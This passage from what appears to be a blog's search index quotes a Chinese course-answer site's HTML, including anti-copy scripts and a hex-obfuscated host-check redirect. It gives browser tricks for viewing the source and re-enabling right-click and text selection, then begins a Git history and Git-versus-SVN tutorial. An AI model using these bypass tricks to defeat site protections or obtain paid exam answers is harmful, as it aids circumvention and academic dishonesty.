content=\"width=device-width, initial-scale=1\"\u003e \u003cnoscript\u003e \u003cmeta http-equiv=\"refresh\" content=\"0; url=http://www.gebidemengmianren.com/my-plugins/no-js.html\" /\u003e\u003c/noscript\u003e \u003clink type=\"text/css\" media=\"all\" href=\"http://www.gebidemengmianren.com/wp-content/cache/autoptimize/css/autoptimize_fbc8fb4f52ab77546156f37a7cb23309.css\" rel=\"stylesheet\" /\u003e \u003ctitle\u003e当代中国政府与政治2019 \u0026#8211; 隔壁的萌面人\u003c/title\u003e \u003clink rel='stylesheet' id='dashicons-css' href='http://www.gebidemengmianren.com/wp-includes/css/dashicons.min.css?ver=6f0a90e1258fc95d5c87f731d5ec4784' type='text/css' media='all' /\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'\u003e\u003c/script\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'\u003e\u003c/script\u003e \u003c!--[if lt IE 9]\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/themes/wellington/js/html5shiv.min.js?ver=3.7.3'\u003e\u003c/script\u003e \u003c![endif]--\u003e \u003cscript type='text/javascript'\u003e var wellington_menu_title = \"\\u83dc\\u5355\"; \u003c/script\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/themes/wellington/js/navigation.js?ver=20160719'\u003e\u003c/script\u003e \u003clink rel='prev' title='密码保护：当代中国经济2019修正版' href='http://www.gebidemengmianren.com/eryadaanfufei/196.html' /\u003e \u003clink rel='next' title='密码保护：当政府遇上互联网2019' href='http://www.gebidemengmianren.com/eryadaanfufei/200.html' /\u003e \u003clink rel=\"canonical\" href=\"http://www.gebidemengmianren.com/eryadaanfufei/198.html\" /\u003e \u003cscript type=\"text/javascript\"\u003e document.ondragstart = function() { return false }; //for image  document.oncontextmenu = function(e) { return false }; //for right click disable  document.onkeydown = function(e) { if (e.ctrlKey \u0026\u0026 (e.keyCode === 65 || e.keyCode === 67 || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 80 || e.keyCode === 83 || e.keyCode === 85 || e.keyCode === 86 || e.keyCode === 117 )) { return false; } if (e.keyCode == 18 || e.keyCode == 123) { return false } }; \u003c/script\u003e \u003clink rel=\"icon\" href=\"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g-150x150.jpg\" sizes=\"32x32\" /\u003e \u003clink rel=\"icon\" href=\"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg\" sizes=\"192x192\" /\u003e \u003clink rel=\"apple-touch-icon-precomposed\" href=\"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg\" /\u003e \u003cmeta name=\"msapplication-TileImage\" content=\"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg\" /\u003e \u003c/head\u003e \u003cbody class=\"post-template-default single single-post postid-198 single-format-standard post-layout-one-column\" id='body'\u003e \u003cscript type=\"text/javascript\"\u003e ! function(t, e) { \"object\" == typeof exports \u0026\u0026 \"object\" == typeof module ? module.exports = e() : \"function\" == typeof define \u0026\u0026 define.amd ? define([], e) : \"object\" == typeof exports ? exports.ClipboardJS = e() : t.ClipboardJS = e() }(this, function() { return function(t) { function e(o) { if (n[o]) return n[o].exports; var r = n[o] = { i: o, l: !1, exports: {} }; return t[o].call(r.exports, r, r.exports, e), r.l = !0, r.exports } var n = {}; return e.m = t, e.c = n, e.i = function(t) { return t }, e.d = function(t, n, o) { e.o(t, n) || Object.defineProperty(t, n, { configurable: !1, enumerable: !0, get: o }) }, e.n = function(t) { var n = t \u0026\u0026 t.__esModule ? function() { return t.default } : function() { return t }; return e.d(n, \"a\", n), n }, e.o = function(t, e) { return Object.prototype.hasOwnProperty.call(t, e) }, e.p = \"\", e(e.s = 3) }([function(t, e, n) { var o, r, i; ! function(a, c) { r = [t, n(7)], o = c, void 0 !== (i = \"function\" == typeof o ? o.apply(e, r) : o) \u0026\u0026 (t.exports = i) }(0, function(t, e) { \"use strict\"; function n(t, e) { if (!(t instanceof e)) throw new TypeError(\"Cannot call a class as a function\") } var o = function(t) { return t \u0026\u0026 t.__esModule ? t : { default: t } }(e), r = \"function\" == typeof Symbol \u0026\u0026 \"symbol\" == typeof Symbol.iterator ? function(t) { return typeof t } : function(t) { return t \u0026\u0026 \"function\" == typeof Symbol \u0026\u0026 t.constructor === Symbol \u0026\u0026 t !== Symbol.prototype ? \"symbol\" : typeof t }, i = function() { function t(t, e) { for (var n = 0; n \u003c e.length; n++) { var o = e[n]; o.enumerable = o.enumerable || !1, o.configurable = !0, \"value\" in o \u0026\u0026 (o.writable = !0), Object.defineProperty(t, o.key, o) } } return function(e, n, o) { return n \u0026\u0026 t(e.prototype, n), o \u0026\u0026 t(e, o), e } }(), a = function() { function t(e) { n(this, t), this.resolveOptions(e), this.initSelection() } return i(t, [{ key: \"resolveOptions\", value: function() { var t = arguments.length \u003e 0 \u0026\u0026 void 0 !== arguments[0] ? arguments[0] : {}; this.action = t.action, this.container = t.container, this.emitter = t.emitter, this.target = t.target, this.text = t.text, this.trigger = t.trigger, this.selectedText = \"\" } }, { key: \"initSelection\", value: function() { this.text ? this.selectFake() : this.target \u0026\u0026 this.selectTarget() } }, { key: \"selectFake\", value: function() { var t = this, e = \"rtl\" == document.documentElement.getAttribute(\"dir\"); this.removeFake(), this.fakeHandlerCallback = function() { return t.removeFake() }, this.fakeHandler = this.container.addEventListener(\"click\", this.fakeHandlerCallback) || !0, this.fakeElem = document.createElement(\"textarea\"), this.fakeElem.style.fontSize = \"12pt\", this.fakeElem.style.border = \"0\", this.fakeElem.style.padding = \"0\", this.fakeElem.style.margin = \"0\", this.fakeElem.style.position = \"absolute\", this.fakeElem.style[e ? \"right\" : \"left\"] = \"-9999px\"; var n = window.pageYOffset || document.documentElement.scrollTop; this.fakeElem.style.top = n + \"px\", this.fakeElem.setAttribute(\"readonly\", \"\"), this.fakeElem.value = this.text, this.container.appendChild(this.fakeElem), this.selectedText = (0, o.default)(this.fakeElem), this.copyText() } }, { key: \"removeFake\", value: function() { this.fakeHandler \u0026\u0026 (this.container.removeEventListener(\"click\", this.fakeHandlerCallback), this.fakeHandler = null, this.fakeHandlerCallback = null), this.fakeElem \u0026\u0026 (this.container.removeChild(this.fakeElem), this.fakeElem = null) } }, { key: \"selectTarget\", value: function() { this.selectedText = (0, o.default)(this.target), this.copyText() } }, { key: \"copyText\", value: function() { var t = void 0; try { t = document.execCommand(this.action) } catch (e) { t = !1 } this.handleResult(t) } }, { key: \"handleResult\", value: function(t) { this.emitter.emit(t ? \"success\" : \"error\", { action: this.action, text: this.selectedText, trigger: this.trigger, clearSelection: this.clearSelection.bind(this) }) } }, { key: \"clearSelection\", value: function() { this.trigger \u0026\u0026 this.trigger.focus(), window.getSelection().removeAllRanges() } }, { key: \"destroy\", value: function() { this.removeFake() } }, { key: \"action\", set: function() { var t = arguments.length \u003e 0 \u0026\u0026 void 0 !== arguments[0] ? arguments[0] : \"copy\"; if (this._action = t, \"copy\" !== this._action \u0026\u0026 \"cut\" !== this._action) throw new Error('Invalid \"action\" value, use either \"copy\" or \"cut\"') }, get: function() { return this._action } }, { key: \"target\", set: function(t) { if (void 0 !== t) { if (!t || \"object\" !== (void 0 === t ? \"undefined\" : r(t)) || 1 !== t.nodeType) throw new Error('Invalid \"target\" value, use a valid Element'); if (\"copy\" === this.action \u0026\u0026 t.hasAttribute(\"disabled\")) throw new Error('Invalid \"target\" attribute. Please use \"readonly\" instead of \"disabled\" attribute'); if (\"cut\" === this.action \u0026\u0026 (t.hasAttribute(\"readonly\") || t.hasAttribute(\"disabled\"))) throw new Error('Invalid \"target\" attribute. You can\\'t cut text from elements with \"readonly\" or \"disabled\" attributes'); this._target = t } }, get: function() { return this._target } }]), t }(); t.exports = a }) }, function(t, e, n) { function o(t, e, n) { if (!t \u0026\u0026 !e \u0026\u0026 !n) throw new Error(\"Missing required arguments\"); if (!c.string(e)) throw new TypeError(\"Second argument must be a String\"); if (!c.fn(n)) throw new TypeError(\"Third argument must be a Function\"); if (c.node(t)) return r(t, e, n); if (c.nodeList(t)) return i(t, e, n); if (c.string(t)) return a(t, e, n); throw new TypeError(\"First argument must be a String, HTMLElement, HTMLCollection, or NodeList\") } function r(t, e, n) { return t.addEventListener(e, n), { destroy: function() { t.removeEventListener(e, n) } } } function i(t, e, n) { return Array.prototype.forEach.call(t, function(t) { t.addEventListener(e, n) }), { destroy: function() { Array.prototype.forEach.call(t, function(t) { t.removeEventListener(e, n) }) } } } function a(t, e, n) { return u(document.body, t, e, n) } var c = n(6), u = n(5); t.exports = o }, function(t, e) { function n() {} n.prototype = { on: function(t, e, n) { var o = this.e || (this.e = {}); return (o[t] || (o[t] = [])).push({ fn: e, ctx: n }), this }, once: function(t, e, n) { function o() { r.off(t, o), e.apply(n, arguments) } var r = this; return o._ = e, this.on(t, o, n) }, emit: function(t) { var e = [].slice.call(arguments, 1), n = ((this.e || (this.e = {}))[t] || []).slice(), o = 0, r = n.length; for (o; o \u003c r; o++) n[o].fn.apply(n[o].ctx, e); return this }, off: function(t, e) { var n = this.e || (this.e = {}), o = n[t], r = []; if (o \u0026\u0026 e) for (var i = 0, a = o.length; i \u003c a; i++) o[i].fn !== e \u0026\u0026 o[i].fn._ !== e \u0026\u0026 r.push(o[i]); return r.length ? n[t] = r : delete n[t], this } }, t.exports = n }, function(t, e, n) { var o, r, i; ! function(a, c) { r = [t, n(0), n(2), n(1)], o = c, void 0 !== (i = \"function\" == typeof o ? o.apply(e, r) : o) \u0026\u0026 (t.exports = i) }(0, function(t, e, n, o) { \"use strict\"; function r(t) { return t \u0026\u0026 t.__esModule ? t : { default: t } } function i(t, e) { if (!(t instanceof e)) throw new TypeError(\"Cannot call a class as a function\") } function a(t, e) { if (!t) throw new ReferenceError(\"this hasn't been initialised - super() hasn't been called\"); return !e || \"object\" != typeof e \u0026\u0026 \"function\" != typeof e ? t : e } function c(t, e) { if (\"function\" != typeof e \u0026\u0026 null !== e) throw new TypeError(\"Super expression must either be null or a function, not \" + typeof e); t.prototype = Object.create(e \u0026\u0026 e.prototype, { constructor: { value: t, enumerable: !1, writable: !0, configurable: !0 } }), e \u0026\u0026 (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e) } function u(t, e) { var n = \"data-clipboard-\" + t; if (e.hasAttribute(n)) return e.getAttribute(n) } var l = r(e), s = r(n), f = r(o), d = \"function\" == typeof Symbol \u0026\u0026 \"symbol\" == typeof Symbol.iterator ? function(t) { return typeof t } : function(t) { return t \u0026\u0026 \"function\" == typeof Symbol \u0026\u0026 t.constructor === Symbol \u0026\u0026 t !== Symbol.prototype ? \"symbol\" : typeof t }, h = function() { function t(t, e) { for (var n = 0; n \u003c e.length; n++) { var o = e[n]; o.enumerable = o.enumerable || !1, o.configurable = !0, \"value\" in o \u0026\u0026 (o.writable = !0), Object.defineProperty(t, o.key, o) } } return function(e, n, o) { return n \u0026\u0026 t(e.prototype, n), o \u0026\u0026 t(e, o), e } }(), p = function(t) { function e(t, n) { i(this, e); var o = a(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this)); return o.resolveOptions(n), o.listenClick(t), o } return c(e, t), h(e, [{ key: \"resolveOptions\", value: function() { var t = arguments.length \u003e 0 \u0026\u0026 void 0 !== arguments[0] ? arguments[0] : {}; this.action = \"function\" == typeof t.action ? t.action : this.defaultAction, this.target = \"function\" == typeof t.target ? t.target : this.defaultTarget, this.text = \"function\" == typeof t.text ? t.text : this.defaultText, this.container = \"object\" === d(t.container) ? t.container : document.body } }, { key: \"listenClick\", value: function(t) { var e = this; this.listener = (0, f.default)(t, \"click\", function(t) { return e.onClick(t) }) } }, { key: \"onClick\", value: function(t) { var e = t.delegateTarget || t.currentTarget; this.clipboardAction \u0026\u0026 (this.clipboardAction = null), this.clipboardAction = new l.default({ action: this.action(e), target: this.target(e), text: this.text(e), container: this.container, trigger: e, emitter: this }) } }, { key: \"defaultAction\", value: function(t) { return u(\"action\", t) } }, { key: \"defaultTarget\", value: function(t) { var e = u(\"target\", t); if (e) return document.querySelector(e) } }, { key: \"defaultText\", value: function(t) { return u(\"text\", t) } }, { key: \"destroy\", value: function() { this.listener.destroy(), this.clipboardAction \u0026\u0026 (this.clipboardAction.destroy(), this.clipboardAction = null) } }], [{ key: \"isSupported\", value: function() { var t = arguments.length \u003e 0 \u0026\u0026 void 0 !== arguments[0] ? arguments[0] : [\"copy\", \"cut\"], e = \"string\" == typeof t ? [t] : t, n = !!document.queryCommandSupported; return e.forEach(function(t) { n = n \u0026\u0026 !!document.queryCommandSupported(t) }), n } }]), e }(s.default); t.exports = p }) }, function(t, e) { function n(t, e) { for (; t \u0026\u0026 t.nodeType !== o;) { if (\"function\" == typeof t.matches \u0026\u0026 t.matches(e)) return t; t = t.parentNode } } var o = 9; if (\"undefined\" != typeof Element \u0026\u0026 !Element.prototype.matches) { var r = Element.prototype; r.matches = r.matchesSelector || r.mozMatchesSelector || r.msMatchesSelector || r.oMatchesSelector || r.webkitMatchesSelector } t.exports = n }, function(t, e, n) { function o(t, e, n, o, r) { var a = i.apply(this, arguments); return t.addEventListener(n, a, r), { destroy: function() { t.removeEventListener(n, a, r) } } } function r(t, e, n, r, i) { return \"function\" == typeof t.addEventListener ? o.apply(null, arguments) : \"function\" == typeof n ? o.bind(null, document).apply(null, arguments) : (\"string\" == typeof t \u0026\u0026 (t = document.querySelectorAll(t)), Array.prototype.map.call( t, function(t) { return o(t, e, n, r, i) })) } function i(t, e, n, o) { return function(n) { n.delegateTarget = a(n.target, e), n.delegateTarget \u0026\u0026 o.call(t, n) } } var a = n(4); t.exports = r }, function(t, e) { e.node = function(t) { return void 0 !== t \u0026\u0026 t instanceof HTMLElement \u0026\u0026 1 === t.nodeType }, e.nodeList = function(t) { var n = Object.prototype.toString.call(t); return void 0 !== t \u0026\u0026 (\"[object NodeList]\" === n || \"[object HTMLCollection]\" === n) \u0026\u0026 \"length\" in t \u0026\u0026 (0 === t.length || e.node(t[0])) }, e.string = function(t) { return \"string\" == typeof t || t instanceof String }, e.fn = function(t) { return \"[object Function]\" === Object.prototype.toString.call(t) } }, function(t, e) { function n(t) { var e; if (\"SELECT\" === t.nodeName) t.focus(), e = t.value; else if (\"INPUT\" === t.nodeName || \"TEXTAREA\" === t.nodeName) { var n = t.hasAttribute(\"readonly\"); n || t.setAttribute(\"readonly\", \"\"), t.select(), t.setSelectionRange(0, t.value.length), n || t.removeAttribute(\"readonly\"), e = t.value } else { t.hasAttribute(\"contenteditable\") \u0026\u0026 t.focus(); var o = window.getSelection(), r = document.createRange(); r.selectNodeContents(t), o.removeAllRanges(), o.addRange(r), e = o.toString() } return e } t.exports = n }]) }); \u003c/script\u003e \u003cscript\u003e var clipboard = new ClipboardJS('.entry-content', { text: function() { //return '';  } }); clipboard.on('success', function(e) { //console.log(e);  }); clipboard.on('error', function(e) { //console.log(e);  }); \u003c/script\u003e \u003cscript type=\"text/javascript\"\u003e str = \"\\x77\\x77\\x77\\x2e\\x67\\x65\\x62\\x69\\x64\\x65\\x6d\\x65\\x6e\\x67\\x6d\\x69\\x61\\x6e\\x72\\x65\\x6e\\x2e\\x63\\x6f\\x6d\"; if (window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x6f\\x73\\x74\"] != str) { location[\"\\x68\\x72\\x65\\x66\"] = location[\"\\x68\\x72\\x65\\x66\"][\"\\x72\\x65\\x70\\x6c\\x61\\x63\\x65\"](window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x6f\\x73\\x74\"], str); } \u003c/script\u003e \u003cdiv id=\"header-top\" class=\"header-bar-wrap\"\u003e\u003c/div\u003e \u003cdiv id=\"page\" class=\"hfeed site\"\u003e \u003ca class=\"skip-link screen-reader-text\" href=\"#content\"\u003eSkip to content\u003c/a\u003e \u003cheader id=\"masthead\" class=\"site-header clearfix\" role=\"banner\"\u003e \u003cdiv class=\"header-main container clearfix\"\u003e \u003cdiv id=\"logo\" class=\"site-branding clearfix\"\u003e \u003cp class=\"site-title\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/\" rel=\"home\"\u003e隔壁的萌面人\u003c/a\u003e\u003c/p\u003e \u003cp class=\"site-description\"\u003e最专业的大学资料分享平台\u003c/p\u003e \u003c/div\u003e \u003cdiv class=\"header-widgets clearfix\"\u003e\u003c/div\u003e \u003c/div\u003e \u003cdiv id=\"main-navigation-wrap\" class=\"primary-navigation-wrap\"\u003e \u003cnav id=\"main-navigation\" class=\"primary-navigation navigation container clearfix\" role=\"navigation\"\u003e \u003cul id=\"menu-menu-1\" class=\"main-navigation-menu\"\u003e \u003cli id=\"menu-item-2987\" class=\"menu-item menu-item-type-post_type menu-item-object-page menu-item-2987\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/question-and-answer\"\u003e常见问题解答\u003c/a\u003e\u003c/li\u003e \u003cli id=\"menu-item-2988\" class=\"menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2988\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/category/zhihuishu\"\u003e智慧树\u003c/a\u003e\u003c/li\u003e \u003cli id=\"menu-item-2989\" class=\"menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-2989\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/category/eryadaanfufei\"\u003e尔雅\u003c/a\u003e\u003c/li\u003e \u003c/ul\u003e \u003c/nav\u003e \u003c/div\u003e \u003c/header\u003e \u003cdiv id=\"content\" class=\"site-content container clearfix\"\u003e \u003csection id=\"primary\" class=\"content-single content-area\"\u003e \u003cmain id=\"main\" class=\"site-main\" role=\"main\"\u003e \u003carticle id=\"post-198\" class=\"post-198 post type-post status-publish format-standard post-password-protected hentry category-eryadaanfufei\"\u003e \u003cheader class=\"entry-header\"\u003e \u003cdiv class=\"entry-meta\"\u003e\u003cspan class=\"meta-date\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/eryadaanfufei/198.html\" title=\"下午10:02\" rel=\"bookmark\"\u003e\u003ctime class=\"entry-date published updated\" datetime=\"2019-03-20T22:02:27+00:00\"\u003e2019年3月20日\u003c/time\u003e\u003c/a\u003e\u003c/span\u003e\u003cspan class=\"meta-author\"\u003e \u003cspan class=\"author vcard\"\u003e\u003ca class=\"url fn n\" href=\"http://www.gebidemengmianren.com/author/meng\" title=\"View all posts by gebilaowang\" rel=\"author\"\u003egebilaowang\u003c/a\u003e\u003c/span\u003e\u003c/span\u003e\u003c/div\u003e \u003ch1 class=\"entry-title\"\u003e密码保护：当代中国政府与政治2019\u003c/h1\u003e \u003c/header\u003e \u003cfooter class=\"entry-footer\"\u003e \u003cdiv class=\"entry-categories clearfix\"\u003e \u003cspan class=\"meta-categories\"\u003e \u003ca href=\"http://www.gebidemengmianren.com/category/eryadaanfufei\" rel=\"category tag\"\u003e尔雅\u003c/a\u003e \u003c/span\u003e\u003c/div\u003e \u003cnav class=\"navigation post-navigation\" role=\"navigation\"\u003e \u003ch2 class=\"screen-reader-text\"\u003e文章导航\u003c/h2\u003e \u003cdiv class=\"nav-links\"\u003e \u003cdiv class=\"nav-previous\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/eryadaanfufei/196.html\" rel=\"prev\"\u003e\u003cspan class=\"screen-reader-text\"\u003ePrevious Post:\u003c/span\u003e当代中国经济2019修正版\u003c/a\u003e\u003c/div\u003e \u003cdiv class=\"nav-next\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/eryadaanfufei/200.html\" rel=\"next\"\u003e\u003cspan class=\"screen-reader-text\"\u003eNext Post:\u003c/span\u003e当政府遇上互联网2019\u003c/a\u003e\u003c/div\u003e \u003c/div\u003e \u003c/nav\u003e \u003c/footer\u003e \u003c/article\u003e \u003cdiv id=\"comments\" class=\"comments-area\"\u003e\u003c/div\u003e \u003c/main\u003e \u003c/section\u003e \u003csection id=\"secondary\" class=\"sidebar widget-area clearfix sidebar-my-flag\" role=\"complementary\"\u003e \u003caside id=\"search-6\" class=\"widget widget_search clearfix\"\u003e \u003cform role=\"search\" method=\"get\" class=\"search-form\" action=\"http://www.gebidemengmianren.com/\"\u003e \u003clabel\u003e \u003cspan class=\"screen-reader-text\"\u003eSearch for:\u003c/span\u003e \u003cinput type=\"search\" class=\"search-field\" placeholder=\"搜索 \u0026hellip;\" value=\"\" name=\"s\" title=\"Search for:\" /\u003e \u003c/label\u003e \u003cbutton type=\"submit\" class=\"search-submit\"\u003e \u003cspan class=\"genericon-search\"\u003e\u003c/span\u003e \u003cspan class=\"screen-reader-text\"\u003eSearch\u003c/span\u003e \u003c/button\u003e\u003c/form\u003e \u003c/aside\u003e \u003c/section\u003e \u003c/div\u003e \u003ca href=\"http://www.gebidemengmianren.com/question-and-answer\" target=\"_blank\"\u003e \u003cdiv class=\"livechat-girl animated\"\u003e \u003cimg class=\"girl\" src=\"http://www.gebidemengmianren.com/kefu/images/en_3.png\"\u003e \u003cdiv class=\"livechat-hint rd-notice-tooltip rd-notice-type-success rd-notice-position-left single-line show_hint\"\u003e \u003cdiv class=\"rd-notice-content\"\u003e 我来帮您！\u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"animated-circles\"\u003e \u003cdiv class=\"circle c-1\"\u003e\u003c/div\u003e \u003cdiv class=\"circle c-2\"\u003e\u003c/div\u003e \u003cdiv class=\"circle c-3\"\u003e\u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/a\u003e \u003clink href=\"http://www.xuexianswer.com/kefu/css/css.css\" rel=\"stylesheet\" media=\"screen\"\u003e \u003cscript type=\"text/javascript\" src=\"http://www.xuexianswer.com/kefu/js/jquery-1.7.1.min.js\"\u003e\u003c/script\u003e \u003cscript type=\"text/javascript\" src=\"http://www.xuexianswer.com/kefu/js/kefu.js\"\u003e\u003c/script\u003e \u003cscript type=\"text/javascript\" src=\"http://www.gebidemengmianren.com/kefu/js/en_3.js\"\u003e\u003c/script\u003e \u003cdiv id=\"footer\" class=\"footer-wrap\"\u003e \u003cfooter id=\"colophon\" class=\"site-footer container clearfix\" role=\"contentinfo\"\u003e \u003cdiv align=\"center\"\u003e \u003ca href=\"http://www.gebidemengmianren.com/\" style='text-decoration:none; color:#939393;'\u003e\u0026copy;隔壁的萌面人\u003c/a\u003e \u003c/br\u003e \u003ca href=\"http://www.beian.miit.gov.cn/\" style='text-decoration:none;color:#939393;'\u003e渝ICP备17014860号-2\u003c/a\u003e \u003c/br\u003e \u003ca target=\"_blank\" href=\"\" style=\"display:inline-block;text-decoration:none;height:20px;line-height:20px;\"\u003e\u003cimg src=\"http://www.xuexianswer.com/beian/logo.png\" style=\"float:left;\" /\u003e \u003cp style=\"float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;\"\u003e渝公网安备 50011402500333号\u003c/p\u003e \u003c/a\u003e \u003cbr\u003e \u003cspan align=\"right\" style=\"display:inline-block;float:right;color:#303030;text-decoration:none;\"\u003e友情链接： \u003ca href=\"http://www.xuexianswer.com/\" style=\"color:#303030;text-decoration:none;\"\u003e萌面人资料铺\u003c/a\u003e\u0026nbsp; \u003ca href=\"http://www.mengmianren.com/\" style=\"color:#303030;text-decoration:none;\"\u003e萌面人网\u003c/a\u003e\u0026nbsp; \u003ca href=\"http://mengmianren.cc/\" style=\"color:#303030;text-decoration:none;\"\u003e萌面人CC网\u003c/a\u003e\u0026nbsp; \u003ca href=\"http://mengmianren.pro/\" style=\"color:#303030;text-decoration:none;\"\u003e萌面人PRO网\u003c/a\u003e \u003c/span\u003e\u003c/div\u003e \u003c/footer\u003e \u003c/div\u003e \u003c/div\u003e \u003cmeta http-equiv=\"imagetoolbar\" content=\"no\"\u003e \u003cscript type=\"text/javascript\"\u003e document.oncontextmenu = function() { return false; }; document.onselectstart = function() { if (event.srcElement.type != \"text\" \u0026\u0026 event.srcElement.type != \"textarea\" \u0026\u0026 event.srcElement.type != \"password\") { return false; } else { return true; } }; if (window.sidebar) { document.onmousedown = function(e) { var obj = e.target; if (obj.tagName.toUpperCase() == 'SELECT' || obj.tagName.toUpperCase() == \"INPUT\" || obj.tagName.toUpperCase() == \"TEXTAREA\" || obj.tagName.toUpperCase() == \"PASSWORD\") { return true; } else { return false; } }; } document.ondragstart = function() { return false; }; \u003c/script\u003e \u003cscript type='text/javascript'\u003e var pvcArgsFrontend = { \"mode\": \"ajax\", \"requestURL\": \"http:\\/\\/www.gebidemengmianren.com\\/wp-content\\/plugins\\/post-views-counter\\/includes\\/ajax.php\", \"postID\": \"198\", \"nonce\": \"8b28046242\" }; \u003c/script\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/plugins/post-views-counter/js/frontend.js?ver=1.3.1'\u003e\u003c/script\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/plugins/bj-lazy-load/js/bj-lazy-load.min.js?ver=2'\u003e\u003c/script\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-includes/js/wp-embed.min.js?ver=6f0a90e1258fc95d5c87f731d5ec4784'\u003e\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e     破解方法   查看源码的一个简单方法：\n在浏览器的地址栏输入以下东西，即可查看源码\nview-source:url 假如是通过js禁用的话，可以在控制台下输入\n1 2 3 4  document.body.oncontextmenu=\"return true\"; //右键菜单 document.body.onselectstart=\"return true\"; //文本选择   ","description":"","tags":["web","javascript"],"title":"js_banned","uri":"/posts/js_banned/"},{"categories":["tech"],"content":"Git  引用：\nGit详细使用教程\nGit教程\nGit本地服务器搭建及使用方法\nGit原理入门解析\n使用原理视角看Git\ngit流程可视化图：https://zhuanlan.zhihu.com/p/132573100\n   Git 的诞生：\n很多人都知道，Linus 在 1991 年创建了开源的 Linux，从此，Linux 系统不断发展，已经成为最大的服务器系统软件了。\nLinus 虽然创建了 Linux，但 Linux 的壮大是靠全世界热心的志愿者参与的，这么多人在世界各地为 Linux 编写代码，那 Linux 的代码是如何管理的呢？\n事实是，在 2002 年以前，世界各地的志愿者把源代码文件通过 diff 的方式发给 Linus，然后由 Linus 本人通过手工方式合并代码！\n你也许会想，为什么 Linus 不把 Linux 代码放到版本控制系统里呢？不是有 CVS、SVN 这些免费的版本控制系统吗？因为 Linus 坚定地反对 CVS 和 SVN，这些集中式的版本控制系统不但速度慢，而且必须联网才能使用。有一些商用的版本控制系统，虽然比 CVS、SVN 好用，但那是付费的，和 Linux 的开源精神不符。\n不过，到了 2002 年，Linux 系统已经发展了十年了，代码库之大让 Linus 很难继续通过手工方式管理了，社区的弟兄们也对这种方式表达了强烈不满，于是 Linus 选择了一个商业的版本控制系统 BitKeeper，BitKeeper 的东家 BitMover 公司出于人道主义精神，授权 Linux 社区免费使用这个版本控制系统。\n安定团结的大好局面在 2005 年就被打破了，原因是 Linux 社区牛人聚集，不免沾染了一些梁山好汉的江湖习气。开发 Samba 的 Andrew 试图破解 BitKeeper 的协议（这么干的其实也不只他一个），被 BitMover 公司发现了（监控工作做得不错！），于是 BitMover 公司怒了，要收回 Linux 社区的免费使用权。\nLinus 可以向 BitMover 公司道个歉，保证以后严格管教弟兄们，嗯，这是不可能的。实际情况是：Linus 花了两周时间自己用 C 写了一个分布式版本控制系统，这就是 Git！一个月之内，Linux 系统的源码已经由 Git 管理了！牛是怎么定义的呢？大家可以体会一下。\nGit 迅速成为最流行的分布式版本控制系统，尤其是 2008 年，GitHub 网站上线了，它为开源项目免费提供 Git 存储，无数开源项目开始迁移至 GitHub，包括 jQuery，PHP，Ruby 等等。\n历史就是这么偶然，如果不是当年 BitMover 公司威胁 Linux 社区，可能现在我们就没有免费而超级好用的 Git 了。\n Git是什么 Git是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。 Git是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。 Git与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。\n先说集中式版本控制系统，版本库是集中存放在中央服务器的，而干活的时候，用的都是自己的电脑，所以要先从中央服务器取得最新的版本，然后开始干活，干完活了，再把自己的活推送给中央服务器。中央服务器就好比是一个图书馆，你要改一本书，必须先从图书馆借出来，然后回到家自己改，改完了，再放回图书馆。\n那分布式版本控制系统与集中式版本控制系统有何不同呢？首先，**分布式版本控制系统根本没有 “中央服务器”，每个人的电脑上都是一个完整的版本库，**这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。既然每个人电脑上都有一个完整的版本库，那多个人如何协作呢？比方说你在自己电脑上改了文件 A，你的同事也在他的电脑上改了文件 A，这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。集中式版本控制系统最大的毛病就是必须联网才能工作。\n Git与SVN的区别 GIT不仅仅是个版本控制系统，它也是个内容管理系统(CMS),工作管理系统等。 Git 与 SVN 区别点：\n GIT是分布式的，SVN不是：这是GIT和其它非分布式的版本控制系统，例如SVN，CVS等，最核心的区别。 2.GIT把内容按元数据方式存储，而SVN是按文件：所有的资源控制系统都是把文件的元信息隐藏在一个类似.svn,.cvs等的文件夹里。 GIT分支和SVN的分支不同：分支在SVN中一点不特别，就是版本库中的另外的一个目录。 GIT没有一个全局的版本号，而SVN有：目前为止这是跟SVN相比GIT缺少的最大的一个特征。 